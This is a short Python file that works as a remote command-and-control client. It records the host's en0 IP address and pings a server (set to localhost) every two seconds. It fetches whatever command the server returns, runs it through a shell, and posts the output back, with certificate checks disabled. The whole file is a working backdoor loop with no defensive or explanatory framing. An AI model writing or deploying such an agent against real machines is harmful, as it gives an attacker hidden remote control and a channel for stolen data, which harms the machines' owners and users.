import requests
import time
import subprocess
import netifaces
SERVER_URL = 'https://127.0.0.1:5000' 

def get_wireless_ip():

    interfaces = netifaces.interfaces()

    for interface in interfaces:
        interface_details = netifaces.ifaddresses(interface)

        if netifaces.AF_INET in interface_details and 'en0' in interface:
            ip_addresses = [addr['addr'] for addr in interface_details[netifaces.AF_INET]]
            return ip_addresses[0] if ip_addresses else None

    return None

def send_ping(ip_address):
    payload = {'machine_ip': ip_address}
    response = requests.post(f"{SERVER_URL}/ping", data=payload,verify=False)
    if response.status_code == 200:
        print('Ping sent successfully.')

def get_command(ip_address):
    payload = {'machine_ip': ip_address}
    response = requests.get(f"{SERVER_URL}/get", params=payload,verify=False)
    if response.status_code == 200:
        data = response.json()
        command = data.get('command')
        if command:
            execute_command(command)

def execute_command(command):
    try:
        # 使用subprocess模块执行命令
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, encoding='utf-8')
        # print(f"Command executed successfully. Result:\n{result}")
    except subprocess.CalledProcessError as e:
        result = e.output
        print(f"Command execution failed. Error:\n{result}")

    send_result(result)

def send_result(result):
    ip_address = get_wireless_ip() 
    payload = {'machine_ip': ip_address, 'result': result}
    response = requests.post(f"{SERVER_URL}/result", data=payload,verify=False)
    if response.status_code == 200:
        print('Result sent successfully.')

if __name__ == '__main__':
    ip_address = get_wireless_ip()
    while True:
        send_ping(ip_address)
        get_command(ip_address)
        time.sleep(2)  
